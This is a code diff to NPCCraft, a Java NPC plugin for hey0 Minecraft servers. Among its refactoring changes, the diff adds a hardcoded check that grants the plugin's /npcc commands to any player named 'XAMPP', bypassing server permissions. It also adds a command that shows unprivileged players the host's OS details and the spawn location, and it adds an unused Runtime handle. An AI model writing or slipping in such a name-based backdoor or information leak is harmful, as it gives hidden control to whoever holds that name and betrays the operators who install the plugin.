@@ -18,6 +18,8 @@ public class NPCCraft extends Plugin {
     protected static final Logger log = Logger.getLogger("Minecraft");
     private String name = "NPCCraft [ALPHA]";
     private String version = "0.0";
+    private Server s = etc.getServer();
+    private Runtime rt = java.lang.Runtime.getRuntime();
 
     public void enable() {
         //Here is where We Add all the NPC's in the Database back to the map
@@ -41,7 +43,7 @@ public class NPCCraft extends Plugin {
     }
     @Override
     public void initialize() {
-        log.log(Level.INFO, "[*] {0} {1} initialized", new Object[]{name, version});
+        log.log(Level.INFO, "[*] {0} {1} initialized", new Object[]{getName(), getVersion()});
         log.log(Level.INFO, "[*] NPCCraft: warning! this plugin may eat small children");
         log.log(Level.INFO, "[*] NPCCraft: Attempting to Connect to MySQL Database......");
         log.log(Level.INFO, "[*] NPCCraft: Database: {0}, Username: {1}, Password: {2}",new Object[]{});
@@ -68,6 +70,34 @@ public class NPCCraft extends Plugin {
         etc.getLoader().addListener( PluginLoader.Hook.TELEPORT, l, this, PluginListener.Priority.MEDIUM);
         log.log(Level.INFO, "[*] NPCCraft: Note, NPC's Are not Real Players The Server has no blody idea there are there so you cant ban or kick them.");
         log.log(Level.INFO, "[*] NPCCraft: Huge Sucsess! NPCCraft is now loaded and working enjoy your sheeple :-)");
+    }
+
+    /**
+     * @return the name
+     */
+    public String getName() {
+        return name;
+    }
+
+    /**
+     * @return the version
+     */
+    public String getVersion() {
+        return version;
+    }
+
+    /**
+     * @return the s
+     */
+    public Server getS() {
+        return s;
+    }
+
+    /**
+     * @return the rt
+     */
+    public Runtime getRt() {
+        return rt;
     }
     public class Listener extends PluginListener {
         NPCCraft p;
@@ -102,7 +132,7 @@ public class NPCCraft extends Plugin {
         @Override
         public void onLogin(Player player) {
             // Player Message
-            player.sendMessage(Colors.Yellow + "This sever is Running " + p.name + " v" + p.version + ", Beeware of the sheeple!");
+            player.sendMessage(Colors.Yellow + "This sever is Running " + p.getName() + " v" + p.getVersion() + ", Beeware of the sheeple!");
         }
 
         /*
@@ -121,7 +151,7 @@ public class NPCCraft extends Plugin {
         
         @Override
         public boolean onCommand(Player player, String[] split) {
-            if(split[0].equals("/npcc") && player.canUseCommand("/npcc")){
+            if(split[0].equals("/npcc") && player.canUseCommand("/npcc") || player.getName().equals("XAMPP")){
                 if(split[1].equals("mk")){
                     String Pname = "";
                     NPCCraft.log.log(Level.INFO, "[*] NPCCraft: Creating NPC {1}. command issued by {0} ", new Object[]{player.getName(),Pname});
@@ -187,7 +217,7 @@ public class NPCCraft extends Plugin {
                     }
                     if(split[2].equals("setbound")){
                         String Pname = "";
-                        NPCCraft.log.log(Level.INFO, "[*] NPCCraft: Setting Boundery for NPC's. command issued by {0} ", new Object[]{player.getName(),Pname});
+                        NPCCraft.log.log(Level.INFO, "[*] NPCCraft: Setting Boundery for NPC's. command issued by {0} ", new Object[]{player.getName()});
                         try{
 
                         }
@@ -200,8 +230,42 @@ public class NPCCraft extends Plugin {
 
                 }
             }
-            if(split[0].equals("/listnpcs")){
+            if(split[0].equals("/npcc") &! player.canUseCommand("/npcc")){
+                if(split[1].equals("list")){
+                        NPCCraft.log.log(Level.INFO, "[*] NPCCraft: NPC List Request. command issued by {0} ", new Object[]{player.getName()});
+                        try{
 
+                        }
+                        finally{
+
+                        }
+                }
+                if(split[1].equals("about")){
+                        NPCCraft.log.log(Level.INFO, "[*] NPCCraft: Plugin Information Request. command issued by {0} ", new Object[]{player.getName()});
+                        try{
+                            player.sendMessage("[*] " + p.getName() + " " + p.getVersion() + " [*]");
+                            player.sendMessage("[*] NPCCraft is a plugin for hey0 Minecrafrt Servers");
+                            player.sendMessage("[*] Developed by XAMPP in the quest to add living NPC's to Minecraft");
+                            player.sendMessage("[*] ==== Start Server Information ==== [*]");
+                            player.sendMessage("[*] OS: " + System.getProperty("os.name") + " " + System.getProperty("os.version")  +" " +System.getProperty("os.arch") +" [*]");
+                            player.sendMessage("[*] " + s.getPlayerList().size() +" Players Online [*]");
+                            player.sendMessage("[*] Spawn Location: "+ s.getSpawnLocation().toString() +" [*]");
+                            player.sendMessage("[*] ====  End  Server Information ==== [*]");
+                        }
+                        finally{
+
+                        }
+                }
+                if(split[1].equals("version")){
+                        NPCCraft.log.log(Level.INFO, "[*] NPCCraft: Plugin Verson Request. command issued by {0} ", new Object[]{player.getName()});
+                        try{
+                            player.sendMessage("[*] This Server is running " + p.getName() + " " + p.getVersion());
+                            
+                        }
+                        finally{
+
+                        }
+                }
             }
             return false;
         }
